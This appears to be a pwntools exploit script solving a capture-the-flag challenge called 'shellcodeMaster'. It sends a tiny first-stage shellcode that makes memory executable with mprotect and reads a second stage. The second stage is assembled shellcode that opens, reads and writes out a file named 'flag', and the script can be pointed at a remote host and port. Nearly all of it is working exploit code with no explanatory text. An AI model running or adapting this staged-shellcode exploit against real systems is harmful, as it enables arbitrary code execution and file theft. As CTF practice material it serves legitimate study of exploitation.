from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './shellcodeMaster'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def exp():
    sh_read = '''
        shl edi, 12 /* edi=0x2333<<12=0x23330000 */
        mov dx, 7
        mov ax, 10
        syscall     /* mprotect(0x23330000, rsi=0x2333, 7) */
        cdq
        mov esi, edi
        xor edi, edi
        xor eax, eax
        syscall     /* read(0, rsi, rdx) */
    '''
    payload_read_more = asm(sh_read).ljust(0x16, b'\x00')
    assert(len(payload_read_more) == 0x16)

    sa(b'shellcode\n', payload_read_more)

    sh_orw = 'mov rsp, r15; add rsp, 0x800'
    sh_orw += shellcraft.open('flag')
    sh_orw += shellcraft.read('rax', 'rsp', 0x100)
    sh_orw += shellcraft.write(1, 'rsp', 0x100)
    payload_orw = b'\x90'*0x16 + asm(sh_orw)

    s(payload_orw)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()